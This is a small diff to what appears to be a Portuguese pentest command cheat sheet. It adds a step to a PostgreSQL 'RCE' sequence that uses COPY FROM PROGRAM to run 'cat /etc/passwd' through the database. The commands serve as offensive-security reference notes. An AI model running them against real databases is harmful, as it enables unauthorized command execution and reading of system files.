@@ -7379,6 +7379,7 @@ Tags: `#comandos-avulsos` `#misc` `Coammandos aleatorios`
 	\d TABLE_NAME OU \d+ TABLE NAME
 	SELECT * FROM table_name
 	RCE
+	CREATE TABLE public.cmd_output (linha text);
 	COPY public.cmd_output FROM PROGRAM 'cat /etc/passwd';
 	SELECT * FROM public.cmd_output;
 	TRUNCATE TABLE public.cmd_output; CLEAN COMMANDS FROM TABLE
